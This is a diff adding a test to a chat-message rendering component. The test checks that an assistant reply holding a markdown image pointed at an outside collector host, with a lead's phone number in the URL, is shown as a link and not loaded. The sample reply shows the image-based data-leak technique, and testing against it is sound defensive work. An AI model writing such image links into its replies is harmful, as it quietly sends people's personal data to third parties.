@@ -27,4 +27,17 @@ describe("ChatMessageRow", () => {
     expect(body).not.toHaveClass("prose-invert");
     expect(body).toHaveTextContent("קריטי");
   });
+
+  it("does not load an image a reply names at an outside address, and shows the address as a link", () => {
+    const outside = "https://collect.example/pixel.png?d=lead-phone-0501234567";
+
+    const { container } = render(
+      <ChatMessageRow role="assistant" content={`סיימתי ![](${outside})`} />,
+    );
+
+    expect(container.querySelector(".cc-md img")).toBeNull();
+    const link = container.querySelector(".cc-md a");
+    expect(link).toHaveAttribute("href", outside);
+    expect(link).toHaveTextContent(outside);
+  });
 });
